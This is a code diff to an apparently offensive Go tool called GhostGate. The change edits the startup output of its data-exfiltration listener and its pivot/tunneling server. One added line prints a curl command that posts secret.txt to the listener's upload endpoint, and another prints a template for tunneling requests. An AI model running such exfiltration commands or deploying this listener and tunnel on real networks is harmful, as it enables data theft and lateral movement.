@@ -3,6 +3,7 @@ package main
 import (
 	"GhostGate/config"
 	"GhostGate/internal/essentail"
+	"GhostGate/internal/networking"
 	"GhostGate/internal/sanitation"
 	"GhostGate/internal/validation"
 	"flag"
@@ -143,8 +144,8 @@ func main(){
 			http.HandleFunc(*uploadFilesUrlPath, essentail.UploadHandler)
 
 			// Prints information about the path
-			fmt.Println("[*] Data Exfiltration Listener active on port 9000")
-			fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
+			fmt.Printf("[*] Data Exfiltration Listener active on port %s", *uploadFilesPort)
+			fmt.Printf("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://%s:%s/upload\n",networking.GetOutboundIP(), *uploadFilesPort)
 			
 			// Listens and serves the server
 			if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
@@ -178,6 +179,12 @@ func main(){
 			http.HandleFunc("/", essentail.HandleTunnel(*tunnelTarget))
 			// Outputs information about whats going on
 			log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
+			// Prints the tunneling messager and how to send requests through it
+			fmt.Printf("[*] Tunnel Listener: curl -X GET http://%s:%s/<path>\n", 
+				networking.GetOutboundIP(), 
+				*tunnelPort,
+			)
+			// Outputs a fatal log
 			log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
 		
 		case "auditCon":
